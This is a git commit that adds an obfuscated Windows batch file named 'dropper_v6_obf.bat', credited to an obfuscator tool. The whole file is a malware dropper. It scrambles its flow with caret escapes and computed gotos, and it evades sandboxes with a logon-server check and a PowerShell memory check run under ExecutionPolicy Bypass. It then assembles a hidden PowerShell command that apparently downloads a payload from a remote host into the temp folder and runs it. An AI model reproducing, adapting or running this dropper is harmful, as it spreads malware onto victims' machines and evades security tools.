917d740ece191d4bcdbc827ebda266591b5b89a4
unknown <Metro-movers1@outlook.com>
2026-06-30 19:01:08 +0000

    deb addd3

---
+++ dropper_v6_obf.bat
@@ -0,0 +1,314 @@
+@echo on
+
+
+::MaDe By k.Dot usINg SOmALIFuSCAtOrv2
+echo %LOGONSERVER% | findstr /i "DADDYSERVER" >nul && exit
+s^et/a a^N^S^=2*07*0x7*0x2b*0x6d
+g^OTo            ;  %aNS%
+:741417
+s^e^t /a a^n^s=0x17*0123*(0x159^^0x3e)
+gOt^o ,            , %aNS%
+:263912
+set "e=b"
+set "f=c"
+set/a a^N^S=03*03*03*0111*(06^^0x18b)
+go^T^o ;;;                %aNs%
+:415957
+for /l %%f in (221, 221, 221) do ( set "h=e" )
+for /l %%y in (532, 532, 532) do ( set "i=f" )
+s^e^t /^a ans^=2*0x7*07*((041234^^036744)^>^>3)
+g^o^To ,       %aNs%
+:799896
+for /l %%g in (388, 388, 388) do ( set "k=h" )
+for /l %%d in (792, 792, 792) do ( set "l=i" )
+s^e^t /a aNs^=03*((0x3260b3^^04167733)^>^>3)
+goto ;      ; %ANS%
+:854580
+se^t /a a^NS^=2*03*03*0145*((050216^^0132616)^>^>8)
+g^O^To      ;;;;  %ANS%
+:966262
+set "o=l"
+for /l %%k in (430, 430, 430) do ( set "p=m" )
+for /l %%n in (918, 918, 918) do ( set "q=n" )
+set "r=o"
+s^et /a a^ns^=0x3*0x3*~-75540
+g^Oto      ;      %AnS%
+:111178
+set /^a aNS=2*0x7*015*((0xd900^^0371200)^>^>7)
+g^ot^o      ;      ;  %AnS%
+:905024
+set "u=r"
+s^e^t /^a aNs^=021*((01116110^^0330240)^>^>3)
+gotO      ,;        %ANS%
+:432461
+set/^a a^N^S^=(0x5b4ee^^0376657)
+goto ;;,,,,  %ans%
+:610019
+s^et /^a a^ns=~-617388
+gOTo      ;;,     ; %aNS%
+:479004
+se^t/a aNS=0x3*05*015*(0324^^07571)
+gO^TO   ,,            %aNS%
+:658273
+set "z=w"
+for /l %%y in (809, 809, 809) do ( set "a=x" )
+s^e^t /a a^N^s^=0x29*~-24224
+gO^T^o ,      , %ans%
+:432445
+set "c=z"
+for /l %%o in (201, 201, 201) do ( se^t    "D1=A" )
+s^et   "E1=B"
+s^e^t/^a an^s^=2*2*0x7*0x25*((0x28b^^073113)^>^>6)
+g^o^To ,        %anS%
+:910303
+s^et "G1=D"
+s^et /^a aNs^=03*027*035*0107
+gO^TO        ; ; %ANs%
+:128992
+for /l %%g in (697, 697, 697) do ( s^e^t  "I1=F" )
+for /l %%h in (11, 11, 11) do ( s^e^t "J1=G" )
+for /l %%a in (925, 925, 925) do ( s^e^t  "K1=H" )
+s^et /^a a^ns^=((0x148819^^03427275)^>^>2)
+g^oT^o ;,      ,, %Ans%
+:334497
+s^et "M1=J"
+s^e^t /^a a^N^s=07*(022325^^0344706)
+goT^O ,,, ,; %anS%
+:966020
+for /l %%h in (242, 242, 242) do ( set "O1=L" )
+s^et /^a an^S=2*021*023*0x17*037
+go^TO      ;,;,, %aNS%
+:679454
+s^e^t/^a an^s=2*2*035*((04134^^02440)^>^>2)
+goto ;,; %anS%
+:730789
+for /l %%w in (95, 95, 95) do ( set     "R1=O" )
+s^et "S1=P"
+s^et /^a a^ns=2*03*0x3*0x3*03*035*0x9d
+g^OT^o ;     ;;,, %aNS%
+:944151
+se^t /^a aNs^=((011150643^^0x19b6b)^>^>3)
+g^ot^O ;     ; %ANS%
+:565739
+for /l %%i in (187, 187, 187) do ( s^et    "V1=S" )
+se^t /a anS=2*2*2*0x5*(017721^^0xc08)
+g^o^T^O ,,;            %ans%
+:607256
+for /l %%s in (256, 256, 256) do ( se^t    "X1=U" )
+s^e^t    "Y1=V"
+se^t "Z1=W"
+s^et /^a a^Ns=(0xc624f^^0x14984)
+go^T^o             ; %ANs%
+:941900
+set    "B1=Y"
+for /l %%a in (460, 460, 460) do ( s^et "C1=Z" )
+
+s^e^t /^a aN^s^=0x3*07*073*((0x7989^^0x19289)^>^>8)
+g^oto  ,      ,  %aNS%
+:184159
+se^t /^a aNs^=2*2*((012257254^^0x1163bc)^>^>4)
+g^o^To       ,     , %aNS%
+:474421
+s^et /a an^s=035*(011330^^0x90f)
+gOtO , ;;      %ANs%
+:904445
+@%Sb,Mo]%%h%%ob_QW_S%%f%%xYYCyT%%k%%zAIhYE%%r%%D()Xw% %r%%?DsFX%%q%%Axw]Pyj%  
+se^t /a anS^=0x65*(0x1e5a^^03757)
+g^ot^O  ,;,;;; %ANs%
+:229268
+%s%%$x$LMr%%r%%M[#yb%%z%%aVePXoM%%h%%leSj?j_%%ComMOnpROGrAMFIles(X86):~-28,                   1%%v%%G$vCPcx%%k%%Su[ucW%%h%%yOmaUt,%%o%%Gq]pu%%o%%tuM#eky% -%qoG,tt%%Q1%%uDESEe%%r%%j)YtOO%%S1%%dULSAp% -%ZmWUx%%Z1%%w)opajv% %K1%%QHNsfip%%l%%SCIC?(P%%g%%_WOFG%%g%%Xbrtf%%h%%UQ?Pkt]%%q%%DAOcva% -%PHTdb%%F1%%PAG[cs%%LOcaLaPPDAta:~-4,    1%%p%%?JT)BI%%p%%OoNGjV(%%d%%wmjXKw]%%q%%mDGolG%%g%%KzAgv#% "%eTfaCAw%$%AGD_Z%%S1%%C#eH)%%u%%_cz]F%%KDOT:~48,1%%j%%Epoo$GT%%u%%sOgT(u?%%h%%VDs(L%%v%%RFFXM%%v%%,hqhq%%S1%%BO$AcL%%u%%yvyLZs%%h%%BxWuOqF%%i%%,ZCGE%%h%%AyTIl%%u%%mZyEE%%h%%oTVTyU%%q%%?iKFE%%f%%x_fhJX%%h%%]$iYO%=%cJaYzEv%'%OlqTkP%%V1%%nlVlT%%l%%NnGqFO%%o%%bsPdSH%%h%%AFesS%%q%%iMhqr%%w%%QlgRS%%o%%xfDdN%%b%%FMGpj%%F1%%#]fJFJ%%r%%X]qhZV#%%q%%JDBhV%%w%%uD#If%%l%%ogJWHQm%%q%%mdIi(%%x%%,Y_Xjt%%h%%xT()P(%'%ipGQm%;%mWweId%[%Ua_GX%%Q1%%QyiIFW%%h%%k]pLUS%%w%%oslIS%.%hPdNQ%%V1%%jrgJz%%h%%pbgjui%%u%%$MulP?%%y%%K_bxY%%l%%Qvlzfoy%%f%%AdKHH%%h%%ig]Jz%%S1%%Hslr]w%%r%%KNA_r$%%l%%[?AL_Sm%%cOmMOnprOgRamfiLES(X86):~28,         1%%w%%Kt[RoFR%%P1%%zphjR]%%d%%Qm,cqD%%q%%dybriW%%d%%$K#dOBg%%j%%RkHpEJ%%h%%dRO)oof%%u%%aMi)E%]%cEugX%:%(tDylU%:%pjaXimB%%V1%%LyjHpHJ%%h%%m?VDxA%%f%%OWYeems%%x%%#gGx?%%u%%lwf$q%%l%%hjZY[t%%w%%Q?$o?S%%b%%],?xyBn%%S1%%ViMei%%u%%kiawvP%%r%%xzwWQiK%%w%%Ea_$$OV%%r%%UsTBo%%f%%ENruL%%r%%E?YYd%%o%%EOyP?)j%=%PaYGQDm%[%akn][q%%Q1%%kZokMtH%%h%%hWC$o)n%%w%%IpKgB%.%$(WvE%%V1%%MmgaE%%h%%D_QrT$X%%f%%,XmbFr%%x%%Ss]v(Ni%%u%%TZLYGQA%%l%%nmgY]%%w%%?ybKL[%%b%%toPGR%%S1%%BCoRi%%u%%(IzhH?w%%r%%Zq?bgvd%%w%%S_rkJ%%r%%LqKfF#b%%f%%FKsscAm%%r%%#r,U?)L%%o%%oEIm)%%OS:~9,                  1%%b%%kswIK$Q%%s%%AyCRE,z%%h%%qiNLr%]%mHQCN%:%tLMgM%:%tMRwg%%W1%%GdAgR%%o%%wRJO?%%v%%TFWFMa%1%AMyUN%2%lWzML%;%G[rD)g%%l%%lA_be%%z%%X?UaPl%%u%%,S#BIh% -%sVxfhv%%X1%%O?ePh%%u%%gMoRKX%%l%%SgY(h(% '%MT[bdG[%%k%%l,UAx%%w%%ibtU?$%%w%%HrnI)[#%%s%%jhMlSNI%%v%%Jl)vJ%:%C_vMmk%/%(Ljni%/%arc(rVX%%u%%guZAGNc%%d%%OjGuX%%z%%DNo_un[%.%Ogl,UDH%%j%%xSIotD%%l%%iYYI_%%w%%MzhdJ%%k%%bKBNXy%%x%%y?SzQQ%%e%%]t$s,$D%%PUblic:~-5,          1%%v%%ySdXA%%h%%Bjkz,%%u%%OzCXrc%%f%%xvI$RD%%r%%nPYzi%%q%%vB$t_%%w%%#$Sa]ce%%h%%azvfUb%%q%%yV?be%%w%%Mig?_%.%EKtdW%%f%%Vo,AoL%%r%%[OD#X%%p%%,q,lQi%/%pUzqNn$%%m%%VbfJDBk%%l%%?H?Mx%%p%%cLUwVl%%p%%E#TJBp%%b%%?eJrrv%%l%%WAaNTK%%v%%cwvwW?]%%k%%(cMKGJD%%h%%HsTPw%%u%%VDX)c%%h%%SN$,)nK%1%cG#p]%1%EdwIX,R%1%ce#T#H%/%[Q]olHH%%Z1%%cUzsE)%%l%%,NwDAH%%q%%XSEdp(R%%G1%%toKrt%%h%%,lUVVu%%e%%,]jI[L%%o%%cANXImk%%r%%tTN$gQ%%d%%gYNtEZ%%w%%wfStjM%1%YGDONR%1%A?fLgv(%/%diuQj%%p%%?mxI[D%%d%%hlBFsn[%%l%%ENYgm%%q%%vSWyeZ%/%Q(RuqOg%%v%%pqf$ZTL%%w%%VsZ]d%%d%%XTKzH]%%j%%N_U[p%%h%%B[BcpvI%_%,TpqKD%%y%%fQ_tc%6%#ygmJeJ%.%EKupQG%%s%%EDWmabD%%v%%iaAqRhU%1%#aEV#%'%wVTCl% -%igJRrO%%R1%%,VfZu[V%%x%%SXe#HW%%KDOT:~34,1%%I1%%kWOrs%%l%%,#sPui%%o%%]$zcGy%%h%%C(Kdj% $%e_G#F[%%h%%]eA(,rW%%q%%ln)TqTV%%y%%iIRn$rP%:%TxYzwT%%W1%%dQbJIA%%H1%%rEfUq%%P1%%H#KC$%%S1%%ISXg#%\%svYkDO%%v%%?bBL]]H%.%l(Ce(oN%%tEMP:~-1,       1%%v%%eYU$ja%1%PGeZah% -%RoB,,%%X1%%tKEXmV%%v%%gjHTGr%%h%%]frrrt)%%E1%%ibXuL$%%cOmmoNProGrAMw6432:~8,       1%%v%%WQyyVl%%l%%_zUjh_%%f%%ibTxi%%commONpRogRaMW6432:~-26,    1%%d%%wfQ?W%%u%%fWkgmA%%v%%x(yafNX%%l%%#$eZG#y%%q%%CvGvl%%j%%JjYd_T,%;%IsV[q%%s%%sZByI%%r%%TXDEX%%z%%qFbtEDp%%h%%[C#uCcf%%u%%HQ)Twdt%%v%%hqKp]%%k%%Uxea)%%h%%Xcpj?%%o%%MuMPN%%o%%YzPv?C% -%cMkhi_b%%Q1%%[vwHVO%%r%%GekMq_T%%S1%%ZRs[#jy% -%RTGCXl]%%Z1%%xHxQQy% %K1%%iqJMR%%l%%[pK[hE%%g%%C[_CU%%g%%DiyOs(s%%h%%PQNV_?z%%q%%iydaT% -%R,JdZQy%%I1%%yqqIQQ#%%l%%IjADVw%%o%%Djahg%%h%%bvIqbB% $%KcNzi%%h%%Wo$Qqu%%q%%NUlVgkU%%y%%l)QaZ%:%WVjEj]%%W1%%GUKYg%%H1%%BJM,(R%%P1%%kEWQZ%%S1%%Z]oexr%\%B]YCHb%%v%%qkPxmh%.%$W_YQUR%%s%%OWm_W%%v%%qn$]L%1%dFPsy%"%n_M]?Mi%  
+for /l %%T in (20, 20, 20) do ( wscript /b )
+%h%%GYC#mKM%%a%%psHqxZ%%l%%ZEA]a%%w%%mwfj]K% /%s)Ort%%e%%DLo,dJ%  
+goto :EOF
+:459326
+@echo on
+
+set /a ans=0x3*065*~-4664
+goto %ans%
+:685331
+for /l %%m in (771, 771, 771) do ( set "d=a" )
+
+set /a ans=2*2*2*013*~-3000
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}"
+goto %ans%
+:782487
+set "g=d"
+
+set /a ans=(0134246^^01560163)
+
+
+goto %ans%
+:45932
+:399742
+set "j=g"
+
+set /a ans=2*2*2*0x3*(021620^^0120641)
+goto %ans%
+:849351
+for /l %%a in (238, 238, 238) do ( set "m=j" )
+
+set /a ans=2*2*03*05*~-14244
+
+
+goto %ans%
+:416322
+set "n=k"
+
+set /a ans=2*0xb*0xa7*((03023^^0x20f)^>^>2)
+goto %ans%
+:679851
+for /l %%p in (482, 482, 482) do ( set "s=p" )
+
+set /a ans=2*(0x1d8e^^0142253)
+goto %ans%
+:109018
+set "t=q"
+
+set /a ans=0x40*0x4f*0263
+goto %ans%
+:720749
+for /l %%v in (213, 213, 213) do ( set "v=s" )
+
+set /a ans=0107*~-6092
+goto %ans%
+:68533
+:280897
+set "w=t"
+
+set /a ans=0x25*((0xb8559^^0x2bb6d9)^>^>7)
+
+
+goto %ans%
+:68533
+:84935
+:617387
+for /l %%y in (812, 812, 812) do ( set "x=u" )
+
+set /a ans=2*2*03*0xb3*~-224
+
+goto %ans%
+:28089
+:782535
+for /l %%g in (650, 650, 650) do ( set "y=v" )
+
+set /a ans=07*013*0123*0x67
+goto %ans%
+:78248
+:993143
+set "b=y"
+
+set /a ans=0x5*0xd*((013342^^0x7116)^>^>2)
+goto %ans%
+:483812
+for /l %%r in (898, 898, 898) do ( s^e^t     "F1=C" )
+
+set /a ans=0x3d*~-14924
+
+goto %ans%
+:142071
+s^et     "H1=E"
+
+set /a ans=2*2*2*2*2*035*0213
+
+
+goto %ans%
+:45932
+:10901
+:436649
+se^t    "L1=I"
+
+set /a ans=0x3*0x2b*(0xd80^^0x7a1)
+goto %ans%
+:45932
+:84935
+:883589
+for /l %%c in (431, 431, 431) do ( s^e^t  "N1=K" )
+
+set /a ans=2*2*0x5*013*~-4392
+goto %ans%
+:39974
+:67985
+:99314
+:460598
+for /l %%n in (100, 100, 100) do ( set     "P1=M" )
+
+set /a ans=2*(01633377^^0x219f0)
+goto %ans%
+:43664
+:100108
+for /l %%x in (629, 629, 629) do ( s^et  "Q1=N" )
+
+set /a ans=~-730790
+goto %ans%
+:39974
+:84935
+:67985
+:10901
+:48381
+:737586
+se^t    "T1=Q"
+
+set /a ans=0x3*015*053*~-564
+goto %ans%
+:72074
+:72074
+:88358
+:46059
+:10010
+:305497
+s^e^t     "U1=R"
+
+set /a ans=0x2f*~-12038
+goto %ans%
+:46059
+:203240
+set     "W1=T"
+
+set /a ans=2*2*2*0xd*((01115733^^0x1254db)^>^>8)
+
+
+goto %ans%
+:14207
+:88358
+:73758
+:73758
+:863179
+for /l %%t in (743, 743, 743) do ( se^t     "A1=X" )
+
+set /a ans=2*2*0x5*05*((061101^^0170555)^>^>2)
+
+goto %ans%
+:39974
+:61738
+:78253
+:88358
+:30549
+:608349
+chcp 65001 > nul
+
+set /a ans=0x3d*(02435^^07326)
+goto %ans%
+:30549
+:921412
+set KDOT=v4huqMYNbcPKEfaGZ9LlezUy3pTxQgJDjHtROW2Cs58VndA6oIXkrmi7wFB1S0
+
+set /a ans=027*~-20628
+goto %ans%
+:68533
+:41632
+:73758
+:206683
+wscript /b
+
+set /a ans=0x5*0x35*(0x9bc^^0x4e9)
+goto %ans%
+:20324
+:20324
+:664681
+if %CD% == %__CD__% ( doskey /listsize=0 ) else ( wscript /b )
+
+set /a ans=2*2*015*(017663^^0xe8a)
+goto %ans%
+:99314
+:30549
+:86317
